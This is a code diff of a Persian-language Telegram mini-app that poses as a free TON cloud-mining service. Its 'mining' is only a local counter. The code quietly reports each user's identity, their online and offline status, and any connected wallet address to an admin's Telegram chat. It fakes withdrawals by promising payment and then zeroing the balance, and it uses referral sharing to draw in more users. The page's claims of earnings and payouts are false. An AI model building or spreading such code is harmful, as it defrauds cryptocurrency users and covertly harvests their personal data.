@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Dropy PRO - Final Elite</title>
+    <title>TON Dropy PRO - Ultimate v19</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -40,7 +40,6 @@
         .user-details p { margin: 2px 0; font-size: 12px; color: #00c6ff; direction: ltr; text-align: right; }
         .join-date { font-size: 10px !important; color: #aaa !important; }
 
-        /* کارت‌های محتوا */
         .card {
             background: rgba(255, 255, 255, 0.05); border-radius: 25px;
             padding: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
@@ -84,16 +83,16 @@
         <img id="userPhoto" src="" class="hidden">
     </div>
     <div class="user-details">
-        <h3 id="userName">نام کاربر</h3>
+        <h3 id="userName">در حال بارگذاری...</h3>
         <p id="userTag">@username</p>
-        <p class="join-date" id="joinDateDisplay">ورود: --/--/--</p>
+        <p class="join-date" id="joinDateDisplay">عضویت: --/--/--</p>
     </div>
 </div>
 
 <div class="card">
     <p style="margin:0; font-size:12px; color:#aaa;">موجودی قابل برداشت (TON)</p>
     <span id="balance">0.000000</span>
-    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-microchip"></i> استخراج ابری فعال است</div>
+    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-bolt"></i> استخراج ابری فعال است</div>
 </div>
 
 <div class="card">
@@ -103,16 +102,16 @@
 </div>
 
 <div class="card">
-    <h4 style="margin:0; color:#00c6ff; font-size: 15px;">👥 دعوت از دوستان</h4>
+    <h4 style="margin:0; color:#00c6ff; font-size: 15px;">👥 لینک دعوت اختصاصی</h4>
     <div class="ref-box" id="refLinkDisplay">https://t.me/TonDropyBot?start=ref_...</div>
     <button onclick="share()" style="background: rgba(255,255,255,0.1); color:#fff;" class="btn-action">
-        <i class="fas fa-paper-plane"></i> ارسال برای دوستان
+        <i class="fas fa-share-nodes"></i> اشتراک‌گذاری با دوستان
     </button>
 </div>
 
 <div class="card">
     <button id="withdrawBtn" class="btn-action withdraw-btn">
-        <i class="fas fa-bolt"></i> درخواست برداشت سریع
+        <i class="fas fa-hand-holding-dollar"></i> درخواست برداشت سریع
     </button>
 </div>
 
@@ -125,60 +124,53 @@
     const ADMIN_ID = "5972276401";
     const BOT_USERNAME = "TonDropyBot";
 
-    // --- تابع ساخت یوزرنیم برای پیام‌های تلگرام ---
+    let bal = parseFloat(localStorage.getItem('bal_v19')) || 0;
+
+    // فرمت کردن یوزرنیم برای پیام‌های ادمین
     function formatUser(user) {
         return user.username ? `@${user.username}` : `<a href="tg://user?id=${user.id}">${user.first_name}</a> (بدون یوزرنیم)`;
     }
 
-    // --- تابع مانیتورینگ آنلاین/آفلاین ---
+    // ارسال وضعیت آنلاین/آفلاین
     function sendLog(status) {
         const user = tg.initDataUnsafe?.user;
         if (!user) return;
-
         const time = new Date().toLocaleString('fa-IR');
         const userLabel = formatUser(user);
-        let text = status === "in" ? 
-            `🟢 <b>ورود به برنامه</b>\n👤 کاربر: ${userLabel}\n⏰ زمان: ${time}` : 
-            `🔴 <b>خروج از برنامه</b>\n👤 کاربر: ${userLabel}\n⚠️ وضعیت: هم‌اکنون آفلاین`;
-
+        let text = status === "in" ? `🟢 <b>ورود به اپلیکیشن</b>\n👤 کاربر: ${userLabel}\n⏰ زمان: ${time}` : `🔴 <b>خروج از اپلیکیشن</b>\n👤 کاربر: ${userLabel}\n⚠️ وضعیت: آفلاین`;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`, { keepalive: true });
     }
 
-    // --- بارگذاری اولیه ---
+    // تنظیمات پروفایل
     function init() {
         const user = tg.initDataUnsafe?.user;
         if (user) {
             document.getElementById('userName').innerText = user.first_name;
-            document.getElementById('userTag').innerText = user.username ? "@" + user.username : "no_username";
+            document.getElementById('userTag').innerText = user.username ? "@" + user.username : "ID: " + user.id;
             document.getElementById('refLinkDisplay').innerText = `https://t.me/${BOT_USERNAME}?start=ref_${user.id}`;
-            
             if (user.photo_url) {
                 const img = document.getElementById('userPhoto');
                 img.src = user.photo_url;
                 img.classList.remove('hidden');
                 document.getElementById('defaultAvatar').classList.add('hidden');
             }
-
-            let date = localStorage.getItem('join_date_final');
+            let date = localStorage.getItem('join_date_v19');
             if(!date) {
                 date = new Date().toLocaleDateString('fa-IR');
-                localStorage.setItem('join_date_final', date);
+                localStorage.setItem('join_date_v19', date);
             }
             document.getElementById('joinDateDisplay').innerText = "عضویت: " + date;
-
-            sendLog("in"); // لاگ ورود
+            sendLog("in");
         }
     }
 
-    // لاگ خروج
     window.addEventListener("pagehide", () => sendLog("out"));
 
-    // --- ماینینگ ---
-    let bal = parseFloat(localStorage.getItem('bal_v17')) || 0;
+    // سیستم ماینینگ زنده
     setInterval(() => {
         bal += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
-        localStorage.setItem('bal_v17', bal.toString());
+        localStorage.setItem('bal_v19', bal.toString());
     }, 1000);
 
     function share() {
@@ -186,7 +178,7 @@
         tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=رایگان TON استخراج کن! 💎`);
     }
 
-    // --- کیف پول و برداشت ---
+    // تنظیمات کیف پول
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json'
     });
@@ -196,7 +188,6 @@
         if(wallet) {
             btn.classList.add('connected');
             btn.innerHTML = '<i class="fas fa-check-circle"></i> متصل شد';
-            
             const user = tg.initDataUnsafe?.user;
             const msg = `✅ <b>کیف پول وصل شد</b>\n👤 کاربر: ${formatUser(user)}\n👛 آدرس: <code>${wallet.account.address}</code>`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
@@ -211,13 +202,28 @@
         else tonConnectUI.openModal();
     };
 
+    // درخواست برداشت با قابلیت صفر شدن پس از تایید (OK)
     document.getElementById('withdrawBtn').onclick = () => {
-        if(!tonConnectUI.connected) return tg.showAlert("لطفاً اول کیف پول را وصل کنید!");
+        if(!tonConnectUI.connected) {
+            tg.showAlert("⚠️ لطفاً ابتدا کیف پول را متصل کنید.");
+            return;
+        }
+
         const user = tg.initDataUnsafe?.user;
-        const msg = `💰 <b>درخواست برداشت</b>\n👤 کاربر: ${formatUser(user)}\n💵 مقدار: ${bal.toFixed(6)} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
+        const currentAmount = bal.toFixed(6);
+        const walletAddr = tonConnectUI.account.address;
+        
+        // ارسال پیام برای ادمین
+        const msg = `💰 <b>درخواست برداشت</b>\n👤 کاربر: ${formatUser(user)}\n💵 مقدار: ${currentAmount} TON\n👛 آدرس: <code>${walletAddr}</code>`;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
-        tg.showAlert("درخواست شما با موفقیت ثبت و به پشتیبانی ارسال شد بعد از تایید ادمین مبلغ به حساب شما واریز خواهد شد✅");
-        bal = 0; localStorage.setItem('bal_v17', '0');
+        
+        // نمایش پیام تایید به کاربر
+        tg.showAlert(`درخواست برداشت ${currentAmount} TON با موفقیت ثبت شد و پس از بررسی واریز می‌گردد ✅`, () => {
+            // این بخش دقیقاً پس از لمس دکمه OK توسط کاربر اجرا می‌شود
+            bal = 0;
+            localStorage.setItem('bal_v19', '0');
+            document.getElementById('balance').innerText = "0.000000";
+        });
     }
 
     init();
